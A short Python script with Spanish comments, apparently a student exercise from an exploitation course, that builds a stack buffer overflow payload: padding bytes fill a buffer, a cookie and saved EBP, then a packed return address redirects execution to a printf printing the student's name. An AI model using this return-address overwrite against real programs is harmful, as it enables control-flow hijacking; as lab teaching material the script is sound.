# -*- coding: utf-8 -*-
from struct import pack

ret_addr = 0x0804849c   # Dirección de printf("Montiel Salas Jesús Jacob!")

output = "A" * 10  # llena buf
output += "BBBB"    # llena cookie
output += "CCCC"    # llena ebp
output += pack("<I", ret_addr)  # establece return address

print(output)
